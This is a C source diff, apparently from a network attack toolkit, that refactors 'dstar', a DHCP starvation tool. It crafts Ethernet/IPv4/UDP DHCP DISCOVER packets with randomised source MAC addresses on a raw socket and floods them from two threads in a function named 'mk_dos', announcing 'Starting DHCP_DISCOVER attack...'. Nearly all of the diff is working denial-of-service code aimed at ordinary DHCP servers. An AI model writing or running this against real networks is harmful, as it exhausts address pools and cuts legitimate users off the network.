@@ -12,12 +12,6 @@
 #include "dstar.h"
 #include "../lib/argsx.h"
 
-unsigned char buff[PKTLEN];
-struct eth_header *ethernet = (struct eth_header *) buff;
-struct ipv4_header *ipv4 = (struct ipv4_header *) (buff + ETHHDRSIZ);
-struct udp_header *udp = (struct udp_header *) (buff + ETHHDRSIZ + IPV4HDRSIZE);
-struct dhcp_pkt *dhcp = (struct dhcp_pkt *) (buff + ETHHDRSIZ + IPV4HDRSIZE + UDPHDRSIZE);
-// ***************************************************************************************
 int sock;
 struct sockaddr_ll iface;
 // **********************
@@ -40,7 +34,7 @@ int main(int argc, char **argv) {
                 printf("%s V: %s\n", APPNAME, VERSION);
                 return 0;
             case 'm':
-                if (!parse_hwaddr(ax_arg, &opt.hwaddr)) {
+                if (!parse_hwaddr(ax_arg, &opt.hwaddr,false)) {
                     fprintf(stderr, "Malformed mac addr!\n");
                     return -1;
                 }
@@ -80,50 +74,40 @@ int main(int argc, char **argv) {
 }
 
 int dstar(struct options *opt) {
+    struct llOptions llo;
+    struct in_addr sip,dip;
+    struct sockaddr dmac;
+
     if (getuid()) {
         fprintf(stderr, "Required elevated privileges!\n");
         return -1;
     }
-    struct dhcp_container dhcpContainer;
-    struct in_addr ipaddr;
-    memset(buff, 0x00, PKTLEN);
-    // Open Socket
-    if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
-    {
-        fprintf(stderr,"Failed to open socket!\n");
-        return -1;
-    }
-    // Build ETHERNET header
-    memset(ethernet->dhwaddr, 0xFF, IFHWADDRLEN); // broadcast mac
-    ethernet->eth_type = htons(ETH_P_IP);
+
+    parse_ipv4addr("0.0.0.0", &sip);
+    parse_ipv4addr("255.255.255.255", &dip);
+    parse_hwaddr("ff:ff:ff:ff:ff:ff",&dmac,true);
     if (!opt->smac) {
         rndhwaddr(&opt->hwaddr);
     }
-    memcpy(ethernet->shwaddr, opt->hwaddr.sa_data, IFHWADDRLEN);
-    // Build IPv4 header
-    ipv4->version = IPV4VERSION;
-    ipv4->ihl = 5;
-    ipv4->dscp = 0;
-    ipv4->ecn = 0;
-    ipv4->len = htons(PKTLEN - ETHHDRSIZ);
-    ipv4->id = 0x00;
-    ipv4->ttl = 64; // hops
-    ipv4->protocol = IPPROTO_UDP; // UDP
-    parse_ipv4addr("255.255.255.255", &ipaddr);
-    ipv4->daddr = ipaddr.s_addr;
-    ipv4_checksum(ipv4);
 
-    // Build udp header
-    build_udp_header(udp, 68, 67, DHCPPKTLEN);
-    // Build dhcp packet
-    build_dhcp_discover(&dhcpContainer, &opt->hwaddr, &ipaddr);
-    dhcp_init_options(&dhcpContainer);
-    memcpy(buff + PKTLEN - DHCPPKTLEN, &dhcpContainer.dhcpPkt, sizeof(struct dhcp_pkt)); // copy dhcp packet to buffer
-    if(!build_sockaddr_ll(&iface, opt->iface_name, &opt->hwaddr)) {
-        fprintf(stderr,"Error while getting interface index, check interface name!\n");
-        close(sock);
+    // Open Socket
+    init_lloptions(&llo,opt->iface_name,0);
+    if ((sock = llsocket(&llo)) < 0)
+    {
+        perror("llsocket");
         return -1;
     }
+
+    struct EthHeader *ethpkt = build_ethernet_packet(&opt->hwaddr,&dmac,ETH_P_IP,PKTLEN-ETHHDRSIZE,NULL);
+    injects_ipv4_header(ethpkt->data,&sip,&dip,5,IPV4HDRSIZE+UDPHDRSIZE+DHCPPKTLEN,build_id(),IPV4DEFTTL,IPPROTO_UDP);
+    injects_udp_header(ethpkt->data+IPV4HDRSIZE,68,67,UDPHDRSIZE+DHCPPKTLEN);
+    struct dhcp_container dhcpContainer;
+    build_dhcp_discover(&dhcpContainer, &opt->hwaddr, &dip);
+    dhcp_init_options(&dhcpContainer);
+    if(opt->sid)
+        dhcpContainer.dhcpPkt.xid=opt->xid;
+    memcpy(ethpkt->data+IPV4HDRSIZE+UDPHDRSIZE, &dhcpContainer.dhcpPkt, sizeof(struct dhcp_pkt)); // copy dhcp packet into udp packet
+
     // HERE
     printf("Starting DHCP_DISCOVER attack...");
     struct th_opt tho[2];
@@ -131,12 +115,15 @@ int dstar(struct options *opt) {
     tho[1].st=opt->snum;
     tho[0].time=opt->num/2;
     tho[1].time=tho[0].time + opt->num%2;
+    tho[0].buff=(unsigned char*)ethpkt;
+    tho[1].buff=(unsigned char*)ethpkt;
     pthread_create(th,NULL,mk_dos,tho);
     pthread_create(th+1,NULL,mk_dos,tho+1);
     printf("\t\t[OK]\n");
     pthread_join(th[0],NULL);
     pthread_join(th[1],NULL);
     close(sock);
+    free(ethpkt);
     return (tho[0].ret==0&&tho[1].ret==0)?0:-1;
 }
 
@@ -148,9 +135,11 @@ void catch_signal(int signo)
 
 void *mk_dos(void *options) {
     struct th_opt *opt = (struct th_opt*)options;
+    struct EthHeader *ethernet = (struct EthHeader*)opt->buff;
+    struct dhcp_pkt *dhcp =(struct dhcp_pkt *)(opt->buff+PKTLEN-DHCPPKTLEN);
     while (opt->st && opt->time > 0 && !stop || !opt->st&&!stop) {
         pthread_mutex_lock(&lock);
-        if(sendto(sock, buff, PKTLEN, 0, (struct sockaddr *) &iface, sizeof(struct sockaddr_ll))<0)
+        if(send(sock, opt->buff, PKTLEN, 0)<0)
         {
             fprintf(stderr,"sendto error\n");
             stop = true;
